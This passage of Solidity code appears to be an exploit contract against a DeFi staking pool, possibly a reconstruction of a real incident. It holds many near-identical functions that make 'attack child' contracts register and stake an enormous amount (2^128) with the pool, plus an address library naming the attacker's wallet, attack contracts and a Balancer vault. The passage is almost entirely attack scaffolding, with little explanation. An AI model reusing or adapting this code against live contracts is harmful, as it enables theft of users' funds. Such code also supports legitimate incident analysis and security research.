        _requireChild(Addresses.attack_child_82A9);
        AttackChild(payable(Addresses.attack_child_82A9))._prepareAttackChil37();
    }

    function _stakeGroup25() internal {
        _requireChild(Addresses.attack_child_6047);
        AttackChild(payable(Addresses.attack_child_6047))._prepareAttackChil52();
        _requireChild(Addresses.attack_child_3F87);
        AttackChild(payable(Addresses.attack_child_3F87))._prepareAttackChil38();
        _requireChild(Addresses.attack_child_1C47);
        AttackChild(payable(Addresses.attack_child_1C47))._prepareAttackChil32();
        _requireChild(Addresses.attack_child_A8C9);
        AttackChild(payable(Addresses.attack_child_A8C9))._prepareAttackChil60();
    }

    function _stakeGroup26() internal {
        _requireChild(Addresses.attack_child_B58B);
        AttackChild(payable(Addresses.attack_child_B58B))._prepareAttackChil56();
        _requireChild(Addresses.attack_child_26C2);
        AttackChild(payable(Addresses.attack_child_26C2))._prepareAttackChil3();
        _requireChild(Addresses.attack_child_A91E);
        AttackChild(payable(Addresses.attack_child_A91E))._prepareAttackChil5();
    }

    function _prepareAttackChil4() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.A_80D93E_511F);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil5() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil6() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil7() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil8() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil9() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil10() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil11() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil12() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil13() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil14() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil15() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil16() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil17() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil18() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil19() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil20() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil21() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil22() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil23() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil24() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil25() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil26() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil27() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil28() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil29() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil30() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil31() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil32() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil33() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil34() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil35() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil36() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil37() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil38() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil39() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil40() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil41() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil42() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil43() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil44() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil45() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil46() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil47() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil48() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil49() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil50() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil51() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil52() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil53() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil54() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil55() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil56() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil57() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil58() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil59() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil60() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil61() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil62() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil63() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil64() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil65() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil66() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil67() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil68() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil69() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil70() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil71() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil72() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil73() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil74() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil75() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil76() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil77() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil78() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil79() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil80() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil81() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil82() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil83() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil84() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil85() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil86() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil87() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil88() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil89() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil90() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil91() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil92() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChild1() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }

    function _prepareAttackChil2() public {
        IStakingPool(Addresses.staking_pool).register(Addresses.attack_child_EC06);
        IStakingPool(Addresses.staking_pool).stake(0x100000000000000000000000000000000);
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant MATEZ = 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9;
    address internal constant attack_child = 0x01362483bA236b57a386752F7953Cee29FebFEA1;
    address internal constant attack_child_CC5D = 0x03AdE1Efa1f091F3Dd300e79B7975bf4e0f9cC5D;
    address internal constant attack_child_6C91 = 0x03d2a275A5cFe9f2f427902026e349525F196c91;
    address internal constant attack_child_E4CA = 0x09eE2C6029EFee78f71A88685dfd76C6ac3AE4Ca;
    address internal constant attack_contract = 0x0aD02ce1b8EB978FD8dc4abeC5bf92Dfa81Ed705;
    address internal constant attack_child_4C34 = 0x0b534C9F970CB5f5210AAa0E7a87EfE0605B4C34;
    address internal constant attack_child_983E = 0x0B54f4A630230D6bc11d0ED3ba178cE24359983E;
    address internal constant attack_child_E4C7 = 0x0D0b1632480A930406a9E7dee3B4Cf6923F1e4C7;
    address internal constant attack_child_D3C4 = 0x0D59bDe38C332B8C77208e518501d0628Ae1d3C4;
    address internal constant attack_child_4FDB = 0x0e5c94eA4c10486023F663D97106830393D84fDb;
    address internal constant attack_child_26C2 = 0x0F233738795eA78ED69f7d6D287CCFae0FC526C2;
    address internal constant attack_child_EC06 = 0x10EDb8294d878F06b90a6D32867E5F81002FeC06;
    address internal constant attack_child_A91E = 0x113B321fb817Bd1e15abD5dFc7715b36337bA91E;
    address internal constant attack_child_2DBB = 0x156959D2440993F434A6622F2Ce6F46651372DBB;
    address internal constant attack_child_3EED = 0x1A388514883BFA1da15f4643Cad8948C75413eEd;
    address internal constant attack_child_0822 = 0x20eD0F469627E672C30f1b1f0D04070096710822;
    address internal constant attack_child_4CD2 = 0x23715691f5F2A09C6a7A86A23d700B877Fb54cD2;
    address internal constant attack_child_D53D = 0x28D66070Bb7dF1b24c04678fCB655364bc67D53d;
    address internal constant attack_child_9F32 = 0x2CfC12D9B7d8f9DB936B79674D0f42B899DB9f32;
    address internal constant attack_child_EB48 = 0x2e2811CaAa4Ae747f246D80bECc6C9Df16cAeB48;
    address internal constant staking_pool = 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa;
    address internal constant attack_child_872D = 0x351949E5b81AA43756471df2d1Eb88349b3f872d;
    address internal constant attack_child_6E85 = 0x352FAE67044CbE5198b4BAE58b61Ecd77dDD6e85;
    address internal constant attack_child_3714 = 0x3cBC2aDE932254Eaf0F339cF0Ece5489D8A63714;
    address internal constant attack_child_A5F4 = 0x3e92940075bc7cc1C12A5Db3d0fCc278aA8aa5F4;
    address internal constant attack_child_21AE = 0x42064d2177Fc6d6C4abE53052Bc5f8be754721aE;
    address internal constant attack_child_6819 = 0x426c1721cB096d5C18587d998906954581Ae6819;
    address internal constant attack_child_5F02 = 0x42F8fa83933E0B17370b61f0c6399215A3155F02;
    address internal constant attack_child_14F1 = 0x48d613E18CfA372d7484CE2cebb4E76a245614F1;
    address internal constant attack_child_D8A7 = 0x4F2F4cce0408Ae633391A40fAEC76a27DC55D8A7;
    address internal constant attack_child_9121 = 0x54eF44a78248Cb31C46763B333Bb1f7e9E769121;
    address internal constant attack_child_D8A5 = 0x567E58Ab062DC153F2CDE9F022B61B782B65d8A5;
    address internal constant attack_child_C686 = 0x568431690059Eb0D4230ef5Dd2b326Ec24e8c686;
    address internal constant attack_child_61CC = 0x579FF8c9C7E3cA8921Dc9497F7CB1e861B2161cC;
    address internal constant attack_child_28B0 = 0x58D0DbC41E2870a175aDebE697b7F250Fb6D28B0;
    address internal constant attack_child_4E43 = 0x654601d31503d8912d3e4d57B40ef04DC4F24e43;
    address internal constant attack_child_1C74 = 0x66e2718475840200Ff99D655082bcFCE022b1C74;
    address internal constant attack_child_519E = 0x68fd8dC89618490B987D532536AAb29c4849519E;
    address internal constant attack_child_6AA9 = 0x6AABE8b8cCBFC06851cf57b648C5BA59f5376aA9;
    address internal constant attack_child_DF23 = 0x6aB082f5f3A301C80bf92c9142D87fb7274CDF23;
    address internal constant attack_child_1C47 = 0x6AB1D89f65871f59F2888D420a2A9a0516501c47;
    address internal constant attack_child_6553 = 0x6D3B3021DfAE2e4A0fbfb62Cb07cb50250876553;
    address internal constant A_6D4432_E3EC = 0x6d44327930bB24F03fa4e6BC079227cc49F2e3Ec;
    address internal constant attack_child_F68E = 0x6DD252a3712A581f2FC93D46dd3aFb98E15EF68E;
    address internal constant attack_child_0F34 = 0x6f94a9Af1C8B2583B070f679a1dBD8618ca40F34;
    address internal constant attack_child_C0BC = 0x706E8382e00508ad25411Bf414c3d08798dAC0BC;
    address internal constant attack_child_82A9 = 0x73D6e1d8273d0A317b512A876319Fa61ccc782A9;
    address internal constant attack_child_3F87 = 0x75215d6770918711cF5ca20211263229d41b3F87;
    address internal constant attack_child_27CC = 0x79c96B4c6eDADe34d53caebf633f6c1d078c27cC;
    address internal constant attack_child_5580 = 0x7Cd0C262A7c4DD207C6b14B2342284c848Cb5580;
    address internal constant attack_child_47AF = 0x7D7bd92071d5f0AfCa7040aC65fA171207a847aF;
    address internal constant A_80D93E_511F = 0x80d93e9451A6830e9A531f15CCa42Cb0357D511f;
    address internal constant attack_child_B28E = 0x80e11f1c38998f9608Be3516dCa4d682C7FdB28E;
    address internal constant attack_child_35C8 = 0x88f42288833e85FA493d2DC472779EDE7D8e35c8;
    address internal constant attack_child_A62A = 0x892ead70AfCFdb0f0e0Ae4271132B7d4b5AEA62A;
    address internal constant attack_child_9795 = 0x8C5c7558F11aA18Ffa32de3BB1D1ecf73cd69795;
    address internal constant attack_child_D656 = 0x8dB22351164FfE3Ec9aAbCca88Ef9ed1B725D656;
    address internal constant attack_child_8374 = 0x8f14E962133024f95b72bc45e56b845Ba2578374;
    address internal constant attack_child_308B = 0x92968D475C73591d6952B4f21C4F4E118d9F308B;
    address internal constant attack_child_A2BB = 0x9b02C6C519375446a6e44BB5E3FA404a0aFDa2Bb;
    address internal constant attack_child_4DAA = 0x9D9A84193E85D2fdCF03E260a795C455AA0B4DaA;
    address internal constant attack_child_9873 = 0x9E2c67266FF80B4877bE8777D214490030059873;
    address internal constant attack_child_6047 = 0xA19F052239f4edfd41e8f6413abC281F95336047;
    address internal constant attack_child_4808 = 0xa557b57aeC05fbA74826acbF71139650cFb54808;
    address internal constant attack_child_B390 = 0xa72745Ec0DB87Ba968d5e0018e31Bce9DBDFB390;
    address internal constant attack_child_4874 = 0xa7c08376E4555d900cED9d2EBD641DC7C8A94874;
    address internal constant attack_child_B58B = 0xa8719ACe44dc5948B99556015fE7c63Ee2B3b58B;
    address internal constant attack_child_5389 = 0xab525b36f03900822db798d4a18cd16c30e85389;
    address internal constant attack_child_4AC2 = 0xAb65dBB83a1fCF8333204CD247E6c3D729E24ac2;
    address internal constant attack_child_C0FF = 0xAEF9dF141799bc78Cf68Ad77bc9E94137bB7c0Ff;
    address internal constant attack_child_A8C9 = 0xB044329d8C3bF5731aAFFEfEa7450F08a2a7A8c9;
    address internal constant attack_child_BFBB = 0xb21370CfEDb88dbc3C027acb17eb972865e4bfBB;
    address internal constant attack_child_2FC9 = 0xB6A0820146628B1dB1346570E17E387d3AcB2FC9;
    address internal constant attack_child_2824 = 0xB7a424B075870b6226188c3a3F372b965E672824;
    address internal constant attack_child_6268 = 0xb8626e32210A17541b59F1D32c4871019FCB6268;
    address internal constant attack_child_6430 = 0xb8E1920f3054901690bDA6dE44ff97D69Ac76430;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant attack_child_8FBE = 0xBbaD118aDa7a1141f654b67a0d2d80eaf9468fBE;
    address internal constant attack_child_E808 = 0xBd447481865b395A2eE74F0F64cb7D67b6A6e808;
    address internal constant attack_child_C6CD = 0xC45B25E1d48c1768eC50f5A45641154A7668c6CD;
    address internal constant attack_child_02E8 = 0xc495e708FA3833a9D10979F0350b5b5983F002e8;
    address internal constant attack_child_2488 = 0xc7a236965230C674D1C87459a2f19c47A7bb2488;
    address internal constant attack_child_1334 = 0xc8D35F097c7a8e690D07D230086b385b894F1334;
    address internal constant attack_child_27AA = 0xcB18D365E1C82989E48cA7F2fBFDD355390427aa;
    address internal constant attack_child_2BEE = 0xCc28580a1d23CDc78aE9cAc199042EaF28772bee;
    address internal constant A_D02275_AE07 = 0xd02275Ee05B2Ca27885a6A40aa5Dc1a20f05aE07;
    address internal constant attack_child_0CE1 = 0xd1B52fA5e7264EE755483C7E837F6355c6010cE1;
    address internal constant attack_child_44F0 = 0xd234cada2C28e92CC6aDd15791768ca0197844F0;
    address internal constant attack_child_0F44 = 0xd37963c0FF331757dA7eBb0032f235D32f0d0f44;
    address internal constant attack_child_D786 = 0xd3F6877A2E66a2fb776fBb832D20F8F22527d786;
    address internal constant attack_child_7553 = 0xd42630e27DD73eE9857dfc07c72c210C69577553;
    address internal constant attack_child_148D = 0xD4Ad417FfF304eD58ABB673aEFeA464C024F148d;
    address internal constant attacker_eoa = 0xd4f04374385341Da7333B82B230cD223143C4d62;
    address internal constant attack_child_300B = 0xd817046b9c675396bEBcF4664De12F811DDC300b;
    address internal constant attack_child_4E29 = 0xd8b26e8d275f6A621082D92BD40542afFd794E29;
    address internal constant attack_child_B6FD = 0xD9FCED7628083A3A7724BD42E6A25f247391B6FD;
    address internal constant attack_child_A9A5 = 0xdC5537E5236C2805DE33d69d5a451a9DE115a9a5;
    address internal constant attack_child_6B57 = 0xDE245De959e0Aa98547fA8AbaF2B5Cc1704f6B57;
    address internal constant A_DE883F_0F34 = 0xDE883f3d535B4b6f11743B151bc16b5b13700F34;
    address internal constant attack_child_D208 = 0xE02E0a6452cb11E7cDd29bE7207FD2D91CE4d208;
    address internal constant attack_child_93BA = 0xE94ad17c9E73a8891f73C8591b918e62e68793bA;
    address internal constant attack_child_F95E = 0xEC8Dc24492ACa09438a7f20940559652E883F95e;
    address internal constant attack_child_9D42 = 0xF2635425cAaeE697cE46bCE8982766427c619D42;
    address internal constant attack_child_A99F = 0xf8a77D8b9314bA0a62A073c363B5C9310e19a99f;
    address internal constant attack_child_EBD3 = 0xFC2fB1d64D04F38dffac13858665f8534EA8Ebd3;
    address internal constant attack_child_3697 = 0xfC51dd6FC9951C7d6862145CEdD68a1748903697;
    address internal constant attack_child_8EB5 = 0xFf0c1C246f353f09C87D662c759F07Aa6adC8Eb5;
    address internal constant attack_child_0417 = 0xff396ef13FD52F83333ced8a63a8D4e2D8d70417;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IStakingPool {
    function claim(uint40, uint40, uint256) external;
    function register(address) external;
    function stake(uint256) external;
}
